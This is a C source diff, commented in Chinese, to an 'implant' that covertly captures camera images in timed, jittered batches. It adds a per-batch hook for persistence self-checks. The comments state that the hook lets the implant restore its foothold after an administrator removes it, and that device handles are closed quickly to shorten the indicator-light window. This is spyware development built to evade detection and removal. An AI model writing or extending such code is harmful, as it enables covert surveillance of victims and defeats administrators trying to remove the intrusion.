@@ -37,6 +37,7 @@ struct implant {
      * 见 implant_run 里 guard 判据的注释：真实时间源 + 等待态 busy-spin
      * 会在第一个批间隔就把 guard 跑满。 */
     implant_sleep_us_t sleep_fn; void *sleep_ud;
+    implant_audit_t   audit_fn;  void *audit_ud;
 
     uint8_t  *jpeg_buf;  size_t jpeg_cap;  size_t jpeg_len;
     uint8_t  *art_buf;   size_t art_cap;   size_t art_len;
@@ -209,6 +210,12 @@ void implant_set_sleep(implant_t *im, implant_sleep_us_t fn, void *ud)
     im->sleep_fn = fn; im->sleep_ud = ud;
 }
 
+void implant_set_audit(implant_t *im, implant_audit_t fn, void *ud)
+{
+    if (!im) return;
+    im->audit_fn = fn; im->audit_ud = ud;
+}
+
 void implant_stop(implant_t *im)
 {
     if (!im) return;
@@ -360,6 +367,11 @@ implant_err_t implant_step(implant_t *im)
         /* 本批结束：立即释放设备句柄（缩短指示灯窗口） */
         if (im->opened) { im->src->close(im->src); im->opened = 0; }
         im->batches_done++;
+
+        /* 批结束钩子。驻留周期性自检挂在这里：管理员删掉驻留后，若只有启动
+         * 时那一次 ensure，常驻进程不重启就永不自愈。返回值刻意不参与状态
+         * 机——自检失败不该让采集停摆，那是"自愈机制反而杀死植入体"。 */
+        if (im->audit_fn) (void)im->audit_fn(im->batches_done, im->audit_ud);
 
         /* 下一批的到期时间 = now + interval + jitter */
         uint64_t gap = im->cfg.interval_ms;
